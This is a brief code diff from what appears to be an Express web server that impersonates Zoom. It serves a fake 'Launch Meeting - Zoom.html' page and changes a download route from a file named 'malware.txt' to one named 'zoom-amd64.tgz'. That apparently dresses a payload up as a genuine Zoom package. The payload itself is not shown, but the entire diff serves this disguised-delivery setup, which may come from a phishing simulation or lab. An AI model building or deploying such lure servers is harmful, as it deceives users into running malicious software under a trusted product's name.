@@ -23,6 +23,6 @@ app.get('/', (req, res) => {
 	res.sendFile(ZOOM_PATH+"/Launch Meeting - Zoom.html");
 });
 
-app.get('/update', (req, res) => {
-	res.sendFile(ZOOM_PATH+"/malware.txt");
+app.get('/zoom-amd64.tgz', (req, res) => {
+	res.sendFile(ZOOM_PATH+"/zoom-amd64.tgz");
 });
